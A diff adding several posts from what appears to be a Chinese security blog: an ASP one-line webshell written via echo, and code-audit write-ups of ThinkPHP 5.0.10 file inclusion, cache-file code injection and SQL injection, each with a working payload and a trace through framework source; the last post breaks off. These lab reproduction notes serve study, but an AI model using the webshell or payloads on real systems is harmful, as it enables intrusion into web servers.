@@ -236,6 +236,1111 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/18/echo写马技巧/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/09/18/echo写马技巧/" itemprop="url">echo写马技巧</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-18T08:15:41+08:00">
+                2018-09-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>win下与Linux写马方式不同 记录一下</p>
+</blockquote>
+<hr>
+<p><strong>1.windows环境：</strong></p>
+<p>错误姿势:</p>
+<pre><code>echo &quot;&lt;%eval request(cmd)%&gt;&quot; &gt; c:\test\test.asp
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/3c1ubw1t3pztnb0ti98k4ppi/image_1cnlvn0if65u1ej713rtjrc1jv19.png" alt="image_1cnlvn0if65u1ej713rtjrc1jv19.png-6.8kB"></p>
+<p>我们可以看到我们的代码加了引号 导致无法执行</p>
+<p>正确姿势:</p>
+<pre><code>echo ^&lt;%eval request(cmd)%^&gt; &gt; c:\test\cmd.asp
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/nd2sueikbr59v1ri2sdev74q/image_1cnlvt3ufjbonoe1gaj91u1eujm.png" alt="image_1cnlvt3ufjbonoe1gaj91u1eujm.png-9.8kB"></p>
+<p><strong>2.Linux环境：</strong><br>linux下正确写马:<code>echo &quot;&lt;%eval request(cmd)%&gt;&quot; &gt; test.asp</code><br><img src="http://static.zybuluo.com/chhyx/fx68wthg11dls5bmxemtinjy/image_1cnm0h7smciu1gel1muegi4150u1j.png" alt="image_1cnm0h7smciu1gel1muegi4150u1j.png-61.1kB"></p>
+<p><strong>参考链接:</strong><br><a href="https://mochazz.github.io/2017/08/26/echo/" target="_blank" rel="noopener">https://mochazz.github.io/2017/08/26/echo/</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/17/ThinkPHP3.x5.x框架任意文件包含/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/09/17/ThinkPHP3.x5.x框架任意文件包含/" itemprop="url">代码审计 | ThinkPHP3.x/5.x框架任意文件包含</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-17T10:15:41+08:00">
+                2018-09-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>最近学习thinkphp框架审计 网上找了几个例子去复现,看到关于这个漏洞的文章不是很多,所以在大佬的payload的基础上自己试着审计了一波,记录一下。</p>
+</blockquote>
+<hr>
+<p>审计cms：<a href="http://www.thinkphp.cn/down.html" target="_blank" rel="noopener">Thinkphp 5.0.10</a><br>漏洞原理:</p>
+<pre><code>ThinkPHP在加载模版解析变量时存在变量覆盖的问题，且没有对 $cacheFile 进行相应的消毒处理，导致模板文件的路径可以被覆盖，从而导致任意文件包含漏洞的发生。
+</code></pre><p>##<strong>1.基础知识:</strong><br>Thinkphp的一些基本操作<br><img src="http://static.zybuluo.com/chhyx/g7pjo7e4gk3hshv17d0equzb/image.png" alt="image.png-73.6kB"></p>
+<p>其他基础知识可参考文章:<br><a href="https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/</a></p>
+<p>##<strong>2.环境搭建:</strong><br>A.</p>
+<pre><code>#thinkphp5_0_10\application\index\controller\Index.php
+&lt;?php
+namespace app\index\controller;
+class Index extends \think\Controller 
+{
+    public function index()
+    {
+        $this-&gt;assign($this-&gt;request-&gt;post());
+        return $this-&gt;fetch();
+
+        }
+}
+</code></pre><p>B.在thinkphp5_0_10\application\index\view\index目录下新建一个index.html，内容随意填写</p>
+<p>C.因为测试漏洞为文件包含 所以在根目录新建一个1.txt当测试用(其他格式也可以 内容<code>&lt;?php phpinfo();?&gt;)</code></p>
+<p>##<strong>3.漏洞利用:</strong><br>payload:</p>
+<pre><code>post:cacheFile=../1.txt
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/068ucjph0k3tr314ximxszv2/image.png" alt="image.png-34kB"></p>
+<p>##<strong>4.代码分析:</strong><br><strong>其相关变量的值已加在注释中:</strong><br>A.从index.php开始分析:</p>
+<pre><code>$this-&gt;assign($this-&gt;request-&gt;post());
+</code></pre><p>进入thinkphp5_0_10\thinkphp\library\think\Controller.php</p>
+<p><img src="http://static.zybuluo.com/chhyx/d3vvbqzjlw3m0h33qojuykrj/image.png" alt="image.png-13.3kB"></p>
+<p>跟进<code>thinkphp5_0_10\thinkphp\library\think\View.php</code></p>
+<pre><code>#thinkphp5_0_10\thinkphp\library\think\View.php 92行
+public function assign($name, $value = &apos;&apos;)
+{      
+    if (is_array($name)) {//$name:[&quot;cacheFile&quot;]=&gt;&quot;../1.txt&quot;
+        //$this-&gt;data:空字符  把$name赋值给$this-&gt;data
+        $this-&gt;data = array_merge($this-&gt;data, $name);
+    } else {
+        $this-&gt;data[$name] = $value;
+    }
+    return $this;
+}
+</code></pre><p>传进去的变量<code>cacheFile</code>成功存储,我们打印下<code>$this</code>:<br><img src="http://static.zybuluo.com/chhyx/8f08wcjbsngdwizmbb7xudjj/image.png" alt="image.png-112.8kB"></p>
+<p>B.返回index.php继续分析:</p>
+<pre><code>return $this-&gt;fetch();
+</code></pre><p>跟进<code>thinkphp5_0_10\thinkphp\library\think\View.php</code><br><img src="http://static.zybuluo.com/chhyx/17x7tdldon5dbxedadlkq2vl/image.png" alt="image.png-13.8kB"></p>
+<p>跟进<code>thinkphp5_0_10\thinkphp\library\think\View.php</code></p>
+<pre><code>#thinkphp5_0_10\thinkphp\library\think\View.php   149行
+public function fetch($template = &apos;&apos;, $vars = [], $replace = [], $config = [], $renderContent = false)
+    {
+        // 模板变量
+        //self::$var:空  $vars:空
+        $vars = array_merge(self::$var, $this-&gt;data, $vars);
+
+        // 页面缓存
+        ob_start();
+        ob_implicit_flush(0);
+
+        // 渲染输出
+        $method = $renderContent ? &apos;display&apos; : &apos;fetch&apos;;//$renderContent=false所以$method=fetch
+        $this-&gt;engine-&gt;$method($template, $vars, $config);//$this-&gt;engine-&gt;$fetch
+
+        // 获取并清空缓存
+
+        $content = ob_get_clean();
+        // 内容过滤标签
+        Hook::listen(&apos;view_filter&apos;, $content);
+        // 允许用户自定义模板的字符串替换
+        $replace = array_merge($this-&gt;replace, $replace);
+        if (!empty($replace)) {
+            $content = strtr($content, $replace);
+        }
+
+        return $content;
+    }
+</code></pre><p>在上面的<code>$this-&gt;engine-&gt;$method($template, $vars, $config);</code> 这里的$method是fetch<br>跟进本文件的<code>engine()</code>方法:</p>
+<pre><code>#thinkphp5_0_10\thinkphp\library\think\View.php   109行
+public function engine($options = [])
+ {   
+     if (is_string($options)) {
+         $type    = $options;
+         $options = [];
+     } else {
+         $type = !empty($options[&apos;type&apos;]) ? $options[&apos;type&apos;] : &apos;Think&apos;;//$type:Think
+     }
+     $class = false !== strpos($type, &apos;\\&apos;) ? $type : &apos;\\think\\view\\driver\\&apos; . ucfirst($type);
+     //$class:\think\view\driver\Think
+     if (isset($options[&apos;type&apos;])) {
+         unset($options[&apos;type&apos;]);
+     }
+     $this-&gt;engine = new $class($options);
+     return $this;
+ }
+</code></pre><p>在上面的<code>$this-&gt;engine = new $class($options);</code>初始化了一个类 我们打印下这个类:<br><img src="http://static.zybuluo.com/chhyx/3m78ae1hfa152s73s73of0xc/image.png" alt="image.png-72.3kB"></p>
+<p>C.跟进<code>thinkphp\library\think\view\driver\Think.php</code> </p>
+<pre><code>#thinkphp5_0_10\thinkphp\library\think\view\driver\Think.php  72行:
+public function fetch($template, $data = [], $config = [])
+{   
+    if (&apos;&apos; == pathinfo($template, PATHINFO_EXTENSION)) {
+        // 获取模板文件名
+        $template = $this-&gt;parseTemplate($template);
+        //$template:application/index\view\index\index.html
+    }
+    // 模板不存在 抛出异常
+    if (!is_file($template)) {
+        throw new TemplateNotFoundException(&apos;template not exists:&apos; . $template, $template);
+    }
+    // 记录视图信息
+    App::$debug &amp;&amp; Log::record(&apos;[ VIEW ] &apos; . $template . &apos; [ &apos; . var_export(array_keys($data), true) . &apos; ]&apos;, &apos;info&apos;);
+    $this-&gt;template-&gt;fetch($template, $data, $config);
+}
+</code></pre><p>在上面的<code>$this-&gt;template-&gt;fetch($template, $data, $config);</code>,我们跟进<code>thinkphp\library\think\Template.php</code></p>
+<pre><code>#thinkphp5_0_10\thinkphp\library\think\Template.php  168行
+public function fetch($template, $vars = [], $config = [])
+    {   
+        //$template:application/index\view\index\index.html
+        //$vars:{ [&quot;cacheFile&quot;]=&gt; string(8) &quot;../1.txt&quot; } 
+        if ($vars) {
+            $this-&gt;data = $vars;
+        }
+        if ($config) {
+            $this-&gt;config($config);
+        }
+        ...
+        $template = $this-&gt;parseTemplateFile($template);
+        //$template:application/index\view\index\index.html
+        if ($template) {
+            $cacheFile = $this-&gt;config[&apos;cache_path&apos;] . $this-&gt;config[&apos;cache_prefix&apos;] . md5($template) . &apos;.&apos; . ltrim($this-&gt;config[&apos;cache_suffix&apos;], &apos;.&apos;);
+            //得到一个缓存文件
+            //&amp;cacheFile:runtime\temp\7e5953484e3b2cf427e4490795d079f3.php
+            ...
+            // 页面缓存
+            ob_start();
+            ob_implicit_flush(0);
+            // 读取编译存储
+            //$this-&gt;storage:object(think\template\driver\File)
+            $this-&gt;storage-&gt;read($cacheFile, $this-&gt;data);
+            // 获取并清空缓存
+            $content = ob_get_clean();
+            if (!empty($this-&gt;config[&apos;cache_id&apos;]) &amp;&amp; $this-&gt;config[&apos;display_cache&apos;]) {
+                // 缓存页面输出
+                Cache::set($this-&gt;config[&apos;cache_id&apos;], $content, $this-&gt;config[&apos;cache_time&apos;]);
+            }
+            echo $content;
+        }
+    }
+</code></pre><p>在上面的<code>$this-&gt;storage-&gt;read($cacheFile, $this-&gt;data);</code>我们打印下看看:<br><img src="http://static.zybuluo.com/chhyx/j7ho82m627t9qpqfrmcxcbao/image.png" alt="image.png-75.5kB"><br>D.跟进<code>thinkphp\library\think\template\driver\File.php</code></p>
+<pre><code>#thinkphp5_0_10\thinkphp\library\think\template\driver\File.php 43行
+public function read($cacheFile, $vars = [])
+    {   
+        //$vars:{ [&quot;cacheFile&quot;]=&gt; string(8) &quot;../1.txt&quot; }
+        //$cacheFile:thinkphp5_0_10\runtime\temp\7e5953484e3b2cf427e4490795d079f3.php
+        if (!empty($vars) &amp;&amp; is_array($vars)) {
+            // 模板阵列变量分解成为独立变量
+            extract($vars, EXTR_OVERWRITE);//如果有冲突,覆盖已有变量
+        }
+        //载入模版缓存文件
+        include $cacheFile;//包含php文件
+    }
+</code></pre><p>上面的<code>extract($vars, EXTR_OVERWRITE);</code>//EXTR_OVERWRITE为默认模式。如果有冲突,则覆盖已有变量。<br>最后成功包含文件。</p>
+<p>最后我们来理一下跟进的文件,方便各位小伙伴复现:</p>
+<pre><code>assign:index.php-&gt;Controller.php-&gt;View.php 
+fetch:index.php-&gt;Controller.php-&gt;View.php-&gt;Think.php-&gt;Template.php-&gt;File.php造成包含
+</code></pre><p>##<strong>5.参考链接:</strong><br><a href="https://www.kancloud.cn/manual/thinkphp5/118113" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5/118113</a><br><a href="https://mp.weixin.qq.com/s/IuKjTS0Q0VVzuoeSwqZ5Gw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/IuKjTS0Q0VVzuoeSwqZ5Gw</a><br><a href="https://mochazz.github.io/2018/04/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%7C%20ThinkPHP3.x%E3%80%815.x%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" target="_blank" rel="noopener">https://mochazz.github.io/2018/04/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%7C%20ThinkPHP3.x%E3%80%815.x%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/16/ThinkPHP5.0.10-3.2.3缓存函数设计缺陷/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/09/16/ThinkPHP5.0.10-3.2.3缓存函数设计缺陷/" itemprop="url">代码审计 | ThinkPHP5.0.10-3.2.3缓存函数设计缺陷</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-16T08:15:41+08:00">
+                2018-09-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>虽然漏洞利用条件苛刻,一般做开发的没人会这么部署,但是对于学习thinkphp框架审计还是有意义的,就当练手了</p>
+</blockquote>
+<hr>
+<p>审计cms:<a href="http://www.thinkphp.cn/down.html" target="_blank" rel="noopener">Thinkphp 5.0.10</a><br>漏洞利用条件:</p>
+<pre><code>1.缓存使用文件方式并且缓存目录暴露在web目录下面
+2.攻击者要能猜到开发者使用的缓存key
+</code></pre><p>##<strong>1.基础知识:</strong><br>助手函数cache()：<br><img src="http://static.zybuluo.com/chhyx/ksell9euf1bwfuwk0qo1xrj7/image_1cng34cnd148m1g2c1lnv15n6f3813.png" alt="image_1cng34cnd148m1g2c1lnv15n6f3813.png-41kB"></p>
+<p>其他基础知识可参考文章:<br><a href="https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/</a></p>
+<p>##<strong>2.环境搭建</strong><br>根据官网下的<a href="http://www.thinkphp.cn/down.html" target="_blank" rel="noopener">安装包</a>安装成功后,根据官网的手册我们用助手函数cache()简单写一个缓存使用方法<br>index.php:</p>
+<pre><code>#thinkphp5_0_10\application\index\controller\Index.php
+&lt;?php
+namespace app\index\controller;
+use think\Cache;//引入缓存  
+class Index
+{
+    public function index()
+    {
+        $options = [
+            // 缓存类型为File
+            &apos;type&apos;  =&gt;  &apos;File&apos;, 
+            // 缓存有效期为永久有效
+            &apos;expire&apos;=&gt;  0, 
+            //缓存前缀
+            &apos;prefix&apos;=&gt;  &apos;think&apos;,
+             // 指定缓存目录
+            &apos;path&apos;  =&gt;  APP_PATH.&apos;runtime/cache/&apos;,
+    ];
+        cache($options);set //缓存初始化
+            $name =input(&apos;get.name&apos;);//助手函数input()获取get传递的name参数
+        cache(&apos;name&apos;,$name,3600);//设置缓存数据(有效期一个小时)
+            var_dump(cache(&apos;name&apos;));//获取缓存数据
+
+        }
+
+}
+</code></pre><p>##<strong>3.漏洞利用</strong><br>payload:</p>
+<pre><code>/public/index.php/index/index/index?name=%2F%2F%0D%0Aphpinfo();//
+</code></pre><p>其中<code>%2F%2F%0D%0A</code> 表示的是 //加换行符<br><img src="http://static.zybuluo.com/chhyx/w4fvp557kotsf3vaptvzelpz/image_1cng33f9m16111b1917v61i1h15oam.png" alt="image_1cng33f9m16111b1917v61i1h15oam.png-23kB"></p>
+<p>访问写入我们php代码的缓存文件<br><img src="http://static.zybuluo.com/chhyx/4168cg3738qisc8fgs9dujhn/image_1cng2gaeoeoh8tffriu6c1sa9.png" alt="image_1cng2gaeoeoh8tffriu6c1sa9.png-45.3kB"></p>
+<p>##<strong>4.代码分析</strong><br>A.助手函数cache()定义的地方</p>
+<pre><code>#thinkphp\helper.php 353行
+function cache($name, $value = &apos;&apos;, $options = null, $tag = null)
+{   
+    //初始化的一些操作
+    if (is_array($options)) {
+        // 缓存操作的同时初始化
+        $cache = Cache::connect($options);
+    } elseif (is_array($name)) {
+        // 缓存初始化
+        return Cache::connect($name);
+    } else {
+        $cache = Cache::init();
+    }
+    ......
+        if (is_null($tag)) {
+            return $cache-&gt;set($name, $value, $expire);
+            //进入set()方法
+</code></pre><p>B.跟入<code>set()</code>方法,在<code>thinkphp\library\think\cache\driver\File.php</code>中:<br>具体变量的值已经写入注释中:</p>
+<pre><code>#thinkphp5_0_10\thinkphp\library\think\cache\driver\File.php 137行
+public function set($name, $value, $expire = null)
+{   
+    //$name=name
+    //$value=// phpinfo();//
+    if (is_null($expire)) {
+        $expire = $this-&gt;options[&apos;expire&apos;];
+    }
+    $filename = $this-&gt;getCacheKey($name);//得到filename
+    if ($this-&gt;tag &amp;&amp; !is_file($filename)) {
+        $first = true;
+    }
+    $data = serialize($value);//$data=s:16:&quot;// phpinfo();//&quot;;
+    if ($this-&gt;options[&apos;data_compress&apos;] &amp;&amp; function_exists(&apos;gzcompress&apos;)) {
+        //数据压缩
+        $data = gzcompress($data, 3);  //配置中无data_compress这个元素
+    }
+    $data   = &quot;&lt;?php\n//&quot; . sprintf(&apos;%012d&apos;, $expire) . $data . &quot;\n?&gt;&quot;;
+    //$data = //000000003600s:16:&quot;//
+              //phpinfo();//&quot;;
+    $result = file_put_contents($filename, $data);
+    //直接写入filename文件中
+    if ($result) {
+        isset($first) &amp;&amp; $this-&gt;setTagItem($filename);
+        clearstatcache();
+        return true;
+    } else {
+        return false;
+    }
+}
+</code></pre><p>C.由代码可看到 在这里只是对写入的内容<code>$data</code>进行了<code>serialize()</code>反序列化操作 最后对<code>$data</code>进行简单的拼接就写入生成的缓存文件中,造成可写入php代码造成getshell<br>其中:</p>
+<pre><code>1.sprintf()将缓存有效期时间3600s 用0填充为12位写入(000000003600)
+2.关于换行符,serialize()并不会对其过滤
+3.在对$data进行拼接时只是简单的//单行注释 我们用回车就可以绕过
+</code></pre><p>D.其中142行左右缓存文件名的获取方法<code>getCacheKey()</code>:</p>
+<pre><code>#thinkphp5_0_10\thinkphp\library\think\cache\driver\File.php 70行
+protected function getCacheKey($name, $auto = false)
+ {
+     $name = md5($name);
+     if ($this-&gt;options[&apos;cache_subdir&apos;]) {
+         // 使用子目录
+         $name = substr($name, 0, 2) . DS . substr($name, 2);
+     }
+     if ($this-&gt;options[&apos;prefix&apos;]) {
+         $name = $this-&gt;options[&apos;prefix&apos;] . DS . $name;
+     }
+     $filename = $this-&gt;options[&apos;path&apos;] . $name . &apos;.php&apos;;
+     $dir      = dirname($filename);
+
+     if ($auto &amp;&amp; !is_dir($dir)) {
+         mkdir($dir, 0755, true);
+     }
+     return $filename;
+ }
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/9d8wtpisvts6ixs923a47tdn/image_1cnh6ta3h30v1n84mbqkd87me9.png" alt="image_1cnh6ta3h30v1n84mbqkd87me9.png-17.2kB"><br>因为配置<code>cache_subdir</code>已经在本文件定义 所以进入第一个if语句</p>
+<pre><code>$name = substr($name, 0, 2) . DS . substr($name, 2);
+</code></pre><p>将前两个字母作为目录 后面的作为缓存文件名<br><img src="http://static.zybuluo.com/chhyx/j0rbrsvh4ehq2w3a3e7oi4o0/image_1cnh76und14p68m81ijb12voslem.png" alt="image_1cnh76und14p68m81ijb12voslem.png-118kB"></p>
+<p>最后得到文件名,与生成的一致。<br><img src="http://static.zybuluo.com/chhyx/bd8g6v60kzrettpgiijp4e0j/image_1cnh7dqusdf6aufuu6np121r13.png" alt="image_1cnh7dqusdf6aufuu6np121r13.png-16.1kB"></p>
+<p>最后访问这个php文件即可</p>
+<p>参考链接:<br><a href="https://www.kancloud.cn/manual/thinkphp5/118131" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5/118131</a><br><a href="https://xz.aliyun.com/t/99" target="_blank" rel="noopener">https://xz.aliyun.com/t/99</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/15/ThinkPHP框架 5.0.x sql注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/09/15/ThinkPHP框架 5.0.x sql注入/" itemprop="url">代码审计 | ThinkPHP框架 5.0.x sql注入</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-15T08:15:41+08:00">
+                2018-09-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>笔者也是第一次审计Thinkphp框架,在结合网上视频跟Thinkphp5.0手册,完成了这次sql注入漏洞的审计,学习记录一波。</p>
+</blockquote>
+<hr>
+<p>##<strong>1.thinkphp基础知识:</strong></p>
+<p>thinkphp初始目录结构:</p>
+<blockquote>
+<pre><code>project  应用部署目录
+├─application           应用目录（可设置）
+│  ├─common             公共模块目录（可更改）
+│  ├─index              模块目录(可更改)
+│  │  ├─config.php      模块配置文件
+│  │  ├─common.php      模块函数文件
+│  │  ├─controller      控制器目录
+│  │  ├─model           模型目录
+│  │  ├─view            视图目录
+│  │  └─ ...            更多类库目录
+│  ├─command.php        命令行工具配置文件
+│  ├─common.php         应用公共（函数）文件
+│  ├─config.php         应用（公共）配置文件
+│  ├─database.php       数据库配置文件
+│  ├─tags.php           应用行为扩展定义文件
+│  └─route.php          路由配置文件
+├─extend                扩展类库目录（可定义）
+├─public                WEB 部署目录（对外访问目录）
+│  ├─static             静态资源存放目录(css,js,image)
+│  ├─index.php          应用入口文件
+│  ├─router.php         快速测试文件
+│  └─.htaccess          用于 apache 的重写
+├─runtime               应用的运行时目录（可写，可设置）
+├─vendor                第三方类库目录（Composer）
+├─thinkphp              框架系统目录
+│  ├─lang               语言包目录
+│  ├─library            框架核心类库目录
+│  │  ├─think           Think 类库包目录
+│  │  └─traits          系统 Traits 目录
+│  ├─tpl                系统模板目录
+│  ├─.htaccess          用于 apache 的重写
+│  ├─.travis.yml        CI 定义文件
+│  ├─base.php           基础定义文件
+│  ├─composer.json      composer 定义文件
+│  ├─console.php        控制台入口文件
+│  ├─convention.php     惯例配置文件
+│  ├─helper.php         助手函数文件（可选）
+│  ├─LICENSE.txt        授权说明文件
+│  ├─phpunit.xml        单元测试配置文件
+│  ├─README.md          README 文件
+│  └─start.php          框架引导文件
+├─build.php             自动生成定义文件（参考）
+├─composer.json         composer 定义文件
+├─LICENSE.txt           授权说明文件
+├─README.md             README 文件
+├─think                 命令行入口文件
+</code></pre></blockquote>
+<p>url访问:</p>
+<pre><code>127.0.0.1:83  /index.php   /Index       /index         /index
+域名          入口文件      前台      前台控制器    index方法
+</code></pre><p>助手函数<a href="https://www.kancloud.cn/manual/thinkphp5/118044" target="_blank" rel="noopener">input()</a>,专用来接收get，post等的值:<br><img src="http://static.zybuluo.com/chhyx/3sb6ttvy8bj5pf1o3wqj1am2/image_1cne0gl8i1jo21s7mj8l7qg1c0220.png" alt="image_1cne0gl8i1jo21s7mj8l7qg1c0220.png-59.1kB"></p>
+<p>##<strong>2.环境搭建:</strong><br>A.新建数据库tp,在数据库tp中新建user表,三个字段 分别为Id、name、pwd</p>
+<p><img src="http://static.zybuluo.com/chhyx/z5zg1yp93oq55yqa8s45vll1/image_1cne5r0511pvo1goqtra1ht6154s4a.png" alt="image_1cne5r0511pvo1goqtra1ht6154s4a.png-18.4kB"></p>
+<p>B.连接数据库并开启调试模式</p>
+<p><img src="http://static.zybuluo.com/chhyx/8n9knmbckzp29o159el9ez2a/image_1cne60jmug89t3puif13jb15cv4n.png" alt="image_1cne60jmug89t3puif13jb15cv4n.png-63.5kB"></p>
+<p>C.简单写一个insert功能,在<code>\application\index\controller\index.php</code><br>写入如下代码:</p>
+<pre><code>&lt;?php
+namespace app\index\controller;
+use think\Db;
+class Index
+{
+    public function user()
+    {
+        return &apos;aa&apos;;
+    }
+    public  function testsql()
+    {
+        $name = input(&apos;get.name/a&apos;);
+        db(&apos;user&apos;)-&gt;where([&apos;id&apos;=&gt; 1])-&gt;insert([&apos;name&apos;=&gt;$name]);
+    }
+}
+</code></pre><p>##<strong>2.漏洞利用:</strong><br>payload:</p>
+<pre><code>http://127.0.0.1:82/index.php/index/index/testsql?name[0]=inc&amp;name[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;name[2]=1
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/s4z4s0daqfnvxf1m3mhysq4p/image_1cne0ak8fq3n1dapnnq18ttqe51j.png" alt="image_1cne0ak8fq3n1dapnnq18ttqe51j.png-71.4kB"></p>
+<p>##<strong>3.代码分析:</strong><br>跟进<code>insert()</code>方法：</p>
+<pre><code>#thinkphp\library\think\db\Query.php 2079行:
+    ......
+public function insert(array $data = [], $replace = false, $getLastInsID = false, $sequence = null)
+    {
+        // 分析查询表达式
+        $options = $this-&gt;parseExpress();
+        $data    = array_merge($options[&apos;data&apos;], $data);
+</code></pre><p>接着:</p>
+<pre><code>$sql = $this-&gt;builder-&gt;insert($data, $options, $replace);
+</code></pre><p>进入bulider.php的insert()方法:</p>
+<pre><code>#thinkphp\library\think\db\Builder.php  719行:
+public function insert(array $data, $options = [], $replace = false)
+{
+    // 分析并处理数据
+$data = $this-&gt;parseData($data, $options);
+</code></pre><p>进入parseDate()方法,相关变量的值已经写入注释:</p>
+<pre><code>#thinkphp\library\think\db\Builder.php  86行:
+protected function parseData($data, $options)
+        {
+            ...
+
+            foreach ($data as $key =&gt; $val) {
